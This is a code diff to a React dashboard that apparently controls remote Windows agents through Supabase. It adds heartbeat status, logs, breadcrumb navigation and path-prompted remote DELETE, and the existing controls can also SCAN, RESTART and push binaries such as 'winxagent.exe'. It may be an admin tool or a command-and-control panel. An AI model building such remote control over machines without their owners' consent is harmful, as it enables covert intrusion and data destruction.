@@ -1,7 +1,9 @@
 "use client";
 import { useEffect, useState } from 'react';
 import { createBrowserClient } from '@supabase/ssr';
-import { Terminal, HardDrive, Search, Trash2, Move, RotateCcw, Folder, FileText, Download, Loader2, Plus, Filter, Monitor } from 'lucide-react';
+import { Terminal, HardDrive, Search, Trash2, Move, RotateCcw, Folder, FileText, Download, Loader2, Plus, Filter, Monitor, ChevronRight } from 'lucide-react';
+
+const MAX_LOG_ENTRIES = 100;
 
 export default function Dashboard() {
   const [logs, setLogs] = useState<any[]>([]);
@@ -10,6 +12,7 @@ export default function Dashboard() {
   const [targetHost, setTargetHost] = useState('');
   const [availableHosts, setAvailableHosts] = useState<string[]>([]);
   const [foldersOnly, setFoldersOnly] = useState(false);
+  const [isOnline, setIsOnline] = useState(false);
   const [currentPath, setCurrentPath] = useState('C:\\Users');
   const [menu, setMenu] = useState<{ x: number; y: number; file: any } | null>(null);
   
@@ -28,7 +31,17 @@ export default function Dashboard() {
     if (data) setFiles(data);
   };
 
+  const fetchLogs = async () => {
+    if (!targetHost) return;
+    const { data } = await supabase.from('logs')
+      .select('*')
+      .eq('computer_name', targetHost)
+      .order('created_at', { ascending: false }).limit(MAX_LOG_ENTRIES);
+    if (data) setLogs(data);
+  };
+
   const fetchHosts = async () => {
+    // Optimized query to only fetch the column we need
     const { data } = await supabase.from('file_structure').select('computer_name');
     if (data) {
       const hosts = Array.from(new Set(data.map(i => i.computer_name)));
@@ -39,10 +52,30 @@ export default function Dashboard() {
     }
   };
 
+  const checkStatus = () => {
+    if (logs.length > 0) {
+      const lastLog = logs[0];
+      const lastSeen = new Date(lastLog.created_at).getTime();
+      const now = new Date().getTime();
+      setIsOnline((now - lastSeen) < 5.5 * 60 * 1000); // Slightly tighter window for 5m heartbeat
+    } else {
+      setIsOnline(false);
+    }
+  };
+
   useEffect(() => {
     fetchHosts();
+  }, []); // Only run once on mount to discover available systems
+
+  useEffect(() => {
+    if (!targetHost) return;
+    
     fetchFiles();
-    setLogs([]); // Reset logs when switching systems
+    fetchLogs();
+    setIsOnline(false);
+
+    // Heartbeat check every 30 seconds
+    const statusTimer = setInterval(checkStatus, 30000);
 
     const closeMenu = () => setMenu(null);
     window.addEventListener('click', closeMenu);
@@ -68,11 +101,16 @@ export default function Dashboard() {
       .subscribe();
 
     return () => { 
+      clearInterval(statusTimer);
       supabase.removeChannel(channel);
       window.removeEventListener('click', closeMenu);
       window.removeEventListener('contextmenu', closeMenu);
     };
   }, [supabase, targetHost]);
+
+  useEffect(() => {
+    checkStatus();
+  }, [logs]);
 
   const handleContextMenu = (e: React.MouseEvent, file: any) => {
     e.preventDefault();
@@ -116,6 +154,11 @@ export default function Dashboard() {
               <option key={host} value={host}>{host}</option>
             ))}
           </select>
+            {targetHost && (
+              <span className={`text-[10px] px-2 py-0.5 rounded ${isOnline ? 'bg-green-900/30 text-green-500' : 'bg-red-900/30 text-red-500'}`}>
+                {isOnline ? '● ONLINE' : '○ OFFLINE'}
+              </span>
+            )}
         </div>
         <div className="text-[10px] text-zinc-600">
           AGENTS_DISCOVERED: {availableHosts.length}
@@ -125,6 +168,26 @@ export default function Dashboard() {
       <div className="grid grid-cols-12 gap-4 flex-1">
       {/* Col 1: Explorer */}
       <div className="col-span-3 border border-zinc-800 p-4 bg-zinc-900/30">
+        {/* Breadcrumbs */}
+        <div className="flex items-center gap-1 text-[10px] text-zinc-500 mb-4 overflow-hidden whitespace-nowrap">
+          {currentPath.split('\\').map((part, i, arr) => (
+            <div key={i} className="flex items-center">
+              <span 
+                className="hover:text-blue-400 cursor-pointer"
+                onClick={() => {
+                  let newPath = arr.slice(0, i + 1).join('\\');
+                  // Ensure C: becomes C:\ so Windows resolves the root correctly
+                  if (newPath.endsWith(':')) newPath += '\\';
+                  if (newPath !== currentPath) {
+                    setCurrentPath(newPath);
+                    sendCmd('SCAN', { path: newPath, foldersOnly });
+                  }
+                }}
+              >{part}</span>
+              {i < arr.length - 1 && <ChevronRight size={10} />}
+            </div>
+          ))}
+        </div>
         <div className="flex justify-between items-center mb-4">
           <h2 className="flex items-center gap-2 text-blue-500"><HardDrive size={16}/> EXPLORER</h2>
           <div className="flex gap-2">
@@ -204,7 +267,13 @@ export default function Dashboard() {
       <div className="col-span-5 border border-zinc-800 flex flex-col bg-zinc-900/30">
         <div className="p-4 border-b border-zinc-800 text-xs font-bold uppercase tracking-tighter">Command Center</div>
         <div className="p-6 grid grid-cols-2 gap-4">
-          <button onClick={() => sendCmd('DELETE')} className="p-4 border border-red-900/50 hover:bg-red-900/20 text-red-500 flex flex-col items-center gap-2">
+          <button 
+            onClick={() => {
+              const path = prompt("Full path of item to delete:");
+              if (path && confirm(`Permanently delete ${path}?`)) sendCmd('DELETE', { path });
+            }} 
+            className="p-4 border border-red-900/50 hover:bg-red-900/20 text-red-500 flex flex-col items-center gap-2"
+          >
             <Trash2 size={24}/> DELETE
           </button>
           <button onClick={() => sendCmd('RESTART')} className="p-4 border border-orange-900/50 hover:bg-orange-900/20 text-orange-500 flex flex-col items-center gap-2">
@@ -212,7 +281,7 @@ export default function Dashboard() {
           </button>
           <button 
             onClick={() => {
-              const storagePath = prompt("Binary filename in 'updates' bucket (e.g. agent.exe):");
+              const storagePath = prompt("Binary filename in 'updates' bucket (e.g. winxagent.exe):");
               if (storagePath) sendCmd('UPDATE', { storagePath });
             }}
             className="p-4 border border-blue-900/50 hover:bg-blue-900/20 text-blue-500 flex flex-col items-center gap-2"
